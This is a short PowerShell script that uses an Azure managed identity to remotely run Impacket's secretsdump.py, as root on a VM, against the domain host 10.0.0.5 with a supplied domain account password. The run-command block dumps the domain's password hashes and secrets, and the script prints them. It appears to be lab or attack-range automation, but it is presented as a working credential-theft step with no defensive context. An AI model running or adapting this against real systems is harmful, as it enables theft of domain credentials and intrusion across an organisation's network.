param (
    [string]$adminPassword,
    [string]$vmName,
    [string]$resourceGroupName
)

Import-Module Az.Compute
Import-Module Az.Accounts

Connect-AzAccount -Identity

$Command = @"
#!/bin/bash
sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
"@


$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $vmName -CommandId "RunShellScript" -ScriptString $Command
# View the full output
$output.Value | ForEach-Object { $_.Message }